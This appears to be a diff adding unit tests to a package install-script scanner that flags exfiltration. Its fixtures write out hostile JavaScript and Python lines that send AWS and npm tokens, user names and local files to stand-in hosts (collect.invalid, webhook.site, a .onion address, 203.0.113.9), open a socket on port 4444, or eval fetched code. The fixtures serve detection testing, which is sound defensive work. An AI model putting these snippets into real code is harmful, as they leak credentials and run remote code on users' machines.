@@ -456,5 +456,225 @@ class InstallTimeTests(unittest.TestCase):
         self.assertNotIn(reason, core.install_script_risk(own))     # an installer's own shortcut
 
 
+class TaggedTemplateWrapperTests(unittest.TestCase):
+    """PANIC-TAGGED (0.1.9, Oct 18): a tagged template call of a script's wrapper of exec or of its getEnv() made the
+    engine panic once the tree held more nodes than list slots (@epoch32/visage 1.14.0's bundle): its readers took the
+    template's slot as the call's argument list. Now the tag's first parameter is the template's strings, read as
+    their text when the template is one piece. Twin of exfiltration.test.js's."""
+
+    PAD = "0;\n" * 3000                     # statements before the call: more nodes than list slots
+    EXEC = ("const { execSync } = require('child_process');\n"
+            "function run(c) { try { return execSync(String(c)).toString(); } catch { return ''; } }\n")
+    ENV = "function getEnv(n) { return process.env[n]; }\n"
+
+    @staticmethod
+    def post(v):
+        return "fetch('https://collect.invalid/c', { method: 'POST', body: %s });\n" % v
+
+    def risk(self, text):
+        return core.install_script_risk(self.PAD + text, lang="js")
+
+    def test_the_template_is_the_command_or_the_name(self):
+        self.assertEqual(self.risk(self.EXEC + self.post("run`whoami`")),
+                         ["sends the machine's user or host name over the network"])
+        self.assertEqual(self.risk(self.ENV + self.post("getEnv`AWS_SECRET_ACCESS_KEY`")),
+                         ["sends environment variables over the network (AWS_SECRET_ACCESS_KEY)"])
+
+    def test_no_constant_text_no_source_and_no_failure(self):
+        self.assertEqual(self.risk(self.EXEC + "const w = 'who';\n" + self.post("run`${w}ami`")), [])
+        self.assertEqual(self.risk(self.ENV + self.post("getEnv`HOST`")), [])
+
+    def test_a_call_as_before(self):
+        self.assertEqual(self.risk(self.EXEC + self.post("run('whoami')")),
+                         ["sends the machine's user or host name over the network"])
+
+
+class FetchFallbackTests(unittest.TestCase):
+    """D-21 (0.1.9): the platform's fetch, and a helper's fallback to it from a parameter (`customFetch ?? fetch`,
+    inspect-ai's view bundle), were found by name to be any function of the script's called `fetch` too (a class's
+    method), so on the tree the call returned what it was given: a route under a system folder (`/data/…`) was a
+    path, and a reader given the response read a file outside the package. Reworked after an independent review: the
+    local fallback/write/class checks do not exclude startup replacements. The old reading therefore stays,
+    including a lone file and the unused Store twin. Twin of exfiltration.test.js's."""
+
+    STORE = "class Store { fetch(k) { return k; } }\n"
+    SENT = "reads files outside the package and sends them over the network ({})"
+    TOP = "const fs = require('fs');\nconst https = require('https');\n"
+    SEND = "  https.request('https://collect.invalid/c', { method: 'POST' }).end(v);\n"
+
+    def helper(self, sig, pick, defs="", call="get('/data/list')"):
+        return ("const https = require('https');\n" + defs + f"async function get(u, {sig}) {{\n  const fetchFn = {pick};\n"
+                "  const r = await fetchFn(u);\n  return r.text();\n}\n"
+                f"async function go(reader) {{\n  const body = await {call};\n"
+                "  const v = await reader.readFile(body);\n" + self.SEND + "}\ngo(globalThis.zip);\n")
+
+    def test_a_lone_file_keeps_unknown_startup_reading(self):
+        for sig, pick in (("c", "fetch"), ("customFetch", "customFetch ?? fetch"), ("customFetch", "customFetch || fetch"),
+                          ("opts = {}", "opts.fetch ?? globalThis.fetch"), ("{ customFetch } = {}", "customFetch ?? fetch")):
+            with self.subTest(pick):
+                self.assertEqual(core.install_script_risk(self.helper(sig, pick, self.STORE), lang="js"), [self.SENT.format("/data/list")])
+
+    def test_startup_replacements_keep_project_hook_critical(self):
+        import json
+        import tempfile
+        from pathlib import Path
+        text = self.helper("customFetch", "customFetch ?? fetch", self.STORE).replace(
+            "go(globalThis.zip)", "go(require('fs').promises)")
+        for mode, command in (("preload", "node -r ./shim.js install.js"),
+                              ("node_options", 'NODE_OPTIONS="--require ./shim.js" node install.js'),
+                              ("earlier", "node -r ./bootstrap.js install.js"),
+                              ("other_file", "node install.js"), ("unknown", "node install.js")):
+            with self.subTest(mode=mode), tempfile.TemporaryDirectory() as tmp:
+                root = Path(tmp)
+                (root / "package.json").write_text(json.dumps({
+                    "name": "inert-review-fixture", "version": "1.0.0",
+                    "scripts": {"postinstall": command}}), encoding="utf-8")
+                (root / "shim.js").write_text("globalThis.fetch = async k => ({text: async () => k});\n", encoding="utf-8")
+                (root / "bootstrap.js").write_text("require('./shim.js');\n", encoding="utf-8")
+                (root / "install.js").write_text(("require('./shim.js');\n" if mode == "other_file" else "") + text, encoding="utf-8")
+                hooks = [i for i in core.scan_project(tmp)["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
+                self.assertTrue(hooks)
+                self.assertEqual({i["sev"] for i in hooks}, {"CRITICAL"})
+                self.assertTrue(any("/data/list" in i["msg"] for i in hooks))
+
+    def test_a_fetch_the_code_puts_on_the_global_object(self):
+        # (the review's HIGH-1: a shim the code installs is what the call reaches)
+        for install in ("globalThis.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+                        "window.fetch = function (p) { return fs.readFileSync(p, 'utf8'); };\n",
+                        "global.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+                        "self.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+                        "Object.assign(globalThis, { fetch: (p) => fs.readFileSync(p, 'utf8') });\n",
+                        "Object.defineProperty(globalThis, 'fetch', { value: function fetch(p) { return fs.readFileSync(p, 'utf8'); } });\n"):
+            text = self.TOP + install + "function go() {\n  const v = fetch('/etc/hostname');\n" + self.SEND + "}\ngo();\n"
+            with self.subTest(install):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.SENT.format("/etc/hostname")])
+        fallback = self.helper("customFetch", "customFetch ?? fetch", self.STORE + "globalThis.fetch = (k) => k;\n")
+        self.assertEqual(core.install_script_risk(fallback, lang="js"), [self.SENT.format("/data/list")])
+
+    def test_an_options_object_of_the_codes_own(self):
+        # (the review's HIGH-2: a class instance, a class's static method, a member defined, an object of entries)
+        for defs, call in (("class Src { fetch(k) { return k; } }\n", "get('/data/list', new Src())"),
+                           ("class Src { static fetch(k) { return k; } }\n", "get('/data/list', Src)"),
+                           ("const d = {};\nObject.defineProperty(d, 'fetch', { value: function fetch(k) { return k; } });\n",
+                            "get('/data/list', d)"),
+                           ("const mine = function fetch(k) { return k; };\n", "get('/data/list', Object.fromEntries([['fetch', mine]]))"),
+                           ("", "get('/data/list', { fetch: (k) => k })")):
+            with self.subTest(call):
+                self.assertEqual(core.install_script_risk(self.helper("opts", "opts.fetch ?? globalThis.fetch", defs, call), lang="js"),
+                                 [self.SENT.format("/data/list")])
+
+    def test_unproven_readings_stand(self):
+        # a call gives the parameter a function, or Store is instantiated: what the parameter or the global holds is
+        # not proven, so the reading by name stands, as 01f8e6b read it (here through Store's method)
+        for defs, call in (("function readList(k) { return k; }\n", "get('/data/list', readList)"),
+                           ("const s = new Store();\n", "get('/data/list')")):
+            with self.subTest(call):
+                text = self.helper("customFetch", "customFetch ?? fetch", self.STORE + defs, call)
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.SENT.format("/data/list")])
+
+    def test_what_the_fallback_receives_is_received(self):
+        text = (self.STORE + "function load(customFetch) {\n  const fetchFn = customFetch ?? fetch;\n"
+                "  return fetchFn('https://files.invalid/p').then((r) => r.text()).then((t) => eval(t));\n}\nload();\n")
+        self.assertIn("runs code it receives over the network", core.install_script_risk(text, lang="js"))
+
+
+class AddressLabelTests(unittest.TestCase):
+    """D-22 (0.1.9): an address label (where a send goes, and a raw IP address, a reason of its own) is read in the
+    code, its comments (and Python's docstrings) blanked: inspect-ai's view bundle "contacts an address typical of
+    data exfiltration (.onion)" from linkify-it's doc comment (`.tlds('onion', true)`, the unofficial `.onion`
+    domain), named once a send was found. Reworked after an independent review: only where no code may read that
+    prose back. Twin of exfiltration.test.js's."""
+
+    LABEL = "contacts an address typical of data exfiltration ({})"
+    SENT = "sends environment variables over the network (NPM_TOKEN)"
+
+    def labels(self, text, lang):
+        return [r for r in core.install_script_risk(text, lang=lang) if r.startswith(self.LABEL[:30])]
+
+    def js(self, host):
+        return f"const v = process.env.NPM_TOKEN;\nfetch('{host}/c', {{ method: 'POST', body: v }});\n"
+
+    def py(self, host):
+        return f"import os, requests\nrequests.post('{host}/c', data=os.environ['NPM_TOKEN'])\n"
+
+    def test_a_comments_address_is_no_label(self):
+        send = self.js("https://collect.invalid")
+        self.assertEqual(core.install_script_risk(send, lang="js"), [self.SENT])
+        for comment in ("// linkify.tlds('onion', true) // add the unofficial `.onion` domain\n",
+                        "/* a capture service for tests: https://webhook.site/0000 */\n",
+                        "// a mirror: http://203.0.113.9/files\n"):
+            with self.subTest(comment):
+                self.assertEqual(self.labels(comment + send, "js"), [])
+                self.assertEqual(self.labels("#!/usr/bin/env node\n" + comment + send, None), [])
+        for prose in ("# results also go to https://webhook.site/0000\n", '"""Uploads to pipedream.net when asked."""\n',
+                      "# a mirror: http://203.0.113.9/files\n"):
+            with self.subTest(prose):
+                self.assertEqual(self.labels(prose + self.py("https://collect.invalid"), "py"), [])
+
+    def test_unknown_file_reads_and_failed_python_keep_raw_text(self):
+        cases = [('js',
+          '// http://203.0.113.9/p\n'
+          'const fs=require("fs");const name=["install","js"].join(".");const '
+          'u=fs.readFileSync(name,"utf8").split("\\n")[0].slice(3);require("http").get(u);'),
+         ('js',
+          '// http://203.0.113.9/p\n'
+          'const fs=require("fs");const [,name]=process.argv;const '
+          'u=fs.readFileSync(name,"utf8");require("http").get(u);'),
+         ('js',
+          '// http://203.0.113.9/p\n'
+          'const f=require("fs");const r=f["read"+"FileSync"];require("http").get(r(name,"utf8"));'),
+         ('py',
+          '# http://203.0.113.9/p\n'
+          'import sys, urllib.request\n'
+          'u=open(sys.argv[:1][0]).readline()[2:].strip()\n'
+          'urllib.request.urlopen(u)'),
+         ('py',
+          '# http://203.0.113.9/p\n'
+          'import urllib.request\n'
+          'u=open(".".join(["install","py"])).readline()[2:].strip()\n'
+          'urllib.request.urlopen(u)'),
+         ('py', '# http://203.0.113.9/p\nx = ('),
+         ('py', '# http://203.0.113.9/p\nx = "unterminated')]
+        for lang, text in cases:
+            with self.subTest(lang=lang, text=text):
+                self.assertIn(self.LABEL.format("http://203.0.113.9"), core.install_script_risk(text, lang=lang))
+
+    def test_the_codes_address_is_one(self):
+        for text, lang, shown in ((self.js("https://abcdefghijklmnop.onion"), "js", ".onion"),
+                                  (self.js("https://webhook.site"), "js", "webhook.site"),
+                                  (self.js("http://203.0.113.9"), "js", "http://203.0.113.9"),
+                                  ("const doc = 'see example.onion';\n" + self.js("https://collect.invalid"), "js", ".onion"),
+                                  ("/* tests: https://webhook.site/0000 */\n" + self.js("https://abcdefghijklmnop.onion"), "js",
+                                   ".onion"),
+                                  (self.py("https://webhook.site"), "py", "webhook.site"),
+                                  (self.py("http://203.0.113.9"), "py", "http://203.0.113.9")):
+            with self.subTest(shown):
+                self.assertEqual(self.labels(text, lang), [self.LABEL.format(shown)])
+
+    def test_prose_the_code_reads_back(self):
+        # reworked after an independent review (its HIGH-3): a text that may read its prose back is read as it is —
+        # a docstring read back, a function's source (JavaScript keeps a function's comments wherever its source is
+        # read), its own file. The raw IP address is a reason of its own: no send is needed.
+        ip = [self.LABEL.format("http://203.0.113.9")]
+        doc = 'def where():\n    """http://203.0.113.9/p"""\n'
+        tail = "\nconst u = where.toString().slice(23, -3);\nrequire('http').get(u);\n"
+        for text, lang in (("import urllib.request\n" + doc + "urllib.request.urlopen(where.__doc__)\n", "py"),
+                           ('import urllib.request\nclass Cfg:\n    """http://203.0.113.9/p"""\nurllib.request.urlopen(Cfg.__doc__)\n', "py"),
+                           ("import inspect, urllib.request\n" + doc + "urllib.request.urlopen(inspect.getdoc(where))\n", "py"),
+                           ("# http://203.0.113.9/p\nimport urllib.request\nurllib.request.urlopen(open(__file__).readline()[2:].strip())\n", "py"),
+                           ("function where() {/*http://203.0.113.9/p*/}" + tail, "js"),
+                           ("function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "String(where)"), "js"),
+                           ("function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "`${where}`"), "js"),
+                           ("// http://203.0.113.9/p\nconst fs = require('fs');\n"
+                            "const u = fs.readFileSync('install.js', 'utf8').split('\\n')[0].slice(3);\nrequire('http').get(u);\n", "js")):
+            with self.subTest(text):
+                self.assertEqual(self.labels(text, lang), ip)
+        sock = 'import socket\ndef where():\n    """203.0.113.9"""\ns = socket.socket()\ns.connect((where.__doc__, 4444))\n'
+        self.assertEqual(core.install_script_risk(sock, lang="py"), [self.LABEL.format("203.0.113.9")])
+        env = ('import os, requests\ndef where():\n    """https://webhook.site/0000"""\n'
+               "requests.post(where.__doc__, data=os.environ['NPM_TOKEN'])\n")
+        self.assertEqual(self.labels(env, "py"), [self.LABEL.format("webhook.site")])
+
+
 if __name__ == "__main__":
     unittest.main()
